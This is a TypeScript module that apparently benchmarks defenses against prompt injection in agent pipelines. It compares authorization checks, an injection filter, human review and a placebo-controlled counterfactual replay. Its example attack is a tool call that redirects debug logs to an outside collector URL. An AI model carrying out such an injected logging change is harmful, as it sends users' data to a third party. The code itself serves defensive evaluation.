// The alternatives a team would actually reach for, each in its best honest
// form, and Doppelgänger, all deciding the same labelled instances.
//
// Every instance is drawn from stated ground-truth parameters (src/eval.ts), so
// the comparison measures the decision rules, not a model's accuracy. Humans
// are assumed to catch every attack they review: the most generous assumption
// possible for "review everything".

import { observeRound, startExperiment } from "./experiment.ts"
import { clopperLower, clopperUpper, DEFAULT_EXPERIMENT } from "./stats.ts"
import type { ExperimentConfig, ToolCall, Verdict } from "./types.ts"

/** Ground truth for one instance. */
export interface Latent {
    attack: boolean
    inScope: boolean
    /** The request's history reaches outside content. */
    tainted: boolean
    /** P(twin keeps the action) with the outside message unchanged / reworded / neutralized. */
    pBase: number
    pControl: number
    pTreatment: number
    /** A key value appears only in outside content. */
    valueLaundered: boolean
    /** P(a prompt-injection filter flags the outside message). */
    pFlag: number
    /** Agents replayed per arm: everything downstream of the outside message. */
    hops: number
}

export type Outcome = "approve" | "review" | "deny"

export interface Decision {
    outcome: Outcome
    /** The decider called it an attack (as opposed to merely asking a human). */
    accused: boolean
    /** Model calls spent deciding. */
    calls: number
    verdict?: Verdict | "running"
}

export type Decider = "authorization" | "filter" | "single-arm" | "review-all" | "doppelganger"

export const DECIDERS: Decider[] = ["authorization", "filter", "single-arm", "review-all", "doppelganger"]

export const DECIDER_LABELS: Record<Decider, string> = {
    authorization: "Authorization only",
    filter: "Prompt-injection filter",
    "single-arm": "Counterfactual, no placebo",
    "review-all": "Human reviews all outside-touched actions",
    doppelganger: "Doppelgänger"
}

export const DECIDER_BLURBS: Record<Decider, string> = {
    authorization: "Allow anything in scope. Every laundered action is in scope.",
    filter: "Flag outside messages that look like instructions; hold everything downstream of a flag.",
    "single-arm": "Replay the chain with the instruction removed, and accuse if the action disappears. No control arm.",
    "review-all": "Taint tracking plus a human on every action whose history touches outside content.",
    doppelganger: "Three-arm, placebo-controlled replay across agents, plus value tracing. Clears what survives; a human sees the rest."
}

const SINK = "https://collector.acme-debug.io/ingest"
const REAL: ToolCall = { name: "logging_configure", args: { service: "webhooks", level: "debug", sink: SINK } }
const KEYS = ["service", "sink"]
const twin = (rand: () => number, p: number): ToolCall => ({ name: REAL.name, args: { ...REAL.args, sink: rand() < p ? SINK : "internal://logs/webhooks" } })

export function decide(d: Decider, x: Latent, rand: () => number, config: ExperimentConfig = DEFAULT_EXPERIMENT): Decision {
    if (!x.inScope) return { outcome: "deny", accused: true, calls: 0 }
    if (!x.tainted) return { outcome: "approve", accused: false, calls: 0 }
    switch (d) {
        case "authorization":
            return { outcome: "approve", accused: false, calls: 0 }
        case "review-all":
            return { outcome: "review", accused: false, calls: 0 }
        case "filter": {
            const flagged = rand() < x.pFlag
            return flagged ? { outcome: "review", accused: true, calls: 1 } : { outcome: "approve", accused: false, calls: 1 }
        }
        case "single-arm": {
            // The best version of a one-arm design: sequential, with exact bounds both ways.
            let k = 0
            let n = 0
            while (n < config.maxRounds) {
                n++
                if (rand() < x.pTreatment) k++
                if (n < config.minRounds) continue
                if (clopperLower(k, n, config.conf) >= config.tauRobust) return { outcome: "approve", accused: false, calls: n * x.hops }
                if (clopperUpper(k, n, config.conf) < config.tauRobust) return { outcome: "review", accused: true, calls: n * x.hops }
            }
            return { outcome: "review", accused: false, calls: n * x.hops }
        }
        case "doppelganger": {
            let s = startExperiment("eval", REAL, KEYS, config)
            while (s.verdict === "running") s = observeRound(s, { baseline: twin(rand, x.pBase), control: twin(rand, x.pControl), treatment: twin(rand, x.pTreatment) })
            const calls = s.rounds.length * 3 * x.hops
            if (x.valueLaundered) return { outcome: "review", accused: s.verdict === "influenced", calls, verdict: s.verdict }
            if (s.verdict === "robust") return { outcome: "approve", accused: false, calls, verdict: s.verdict }
            return { outcome: "review", accused: s.verdict === "influenced", calls, verdict: s.verdict }
        }
    }
}
